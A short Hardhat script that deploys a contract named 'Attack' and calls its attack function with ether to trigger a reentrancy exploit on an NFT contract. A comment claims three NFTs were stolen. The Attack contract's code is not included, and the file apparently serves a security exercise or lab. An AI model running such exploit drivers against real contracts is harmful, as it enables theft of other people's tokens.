require("dotenv").config();
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // deploy the contract
  // you can make the constructor payable and deploy with some value
  // in that case, you will just need to call attack without a value (ether stored in contract will be sent)
  const Nft = await hre.ethers.getContractFactory("Attack");
  const nft = await Nft.deploy();

  await nft.deployed();

  console.log("AttackNFT deployed at: ", nft.address);
  
  // now call the attack function and wait for the contract to reenter
  const attack = await nft.attack({ value: ethers.utils.parseEther("0.01") });
  await attack.wait();
  console.log("completed");
  // done , now numNFTs = 4; (we stole 3 NFTs)
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
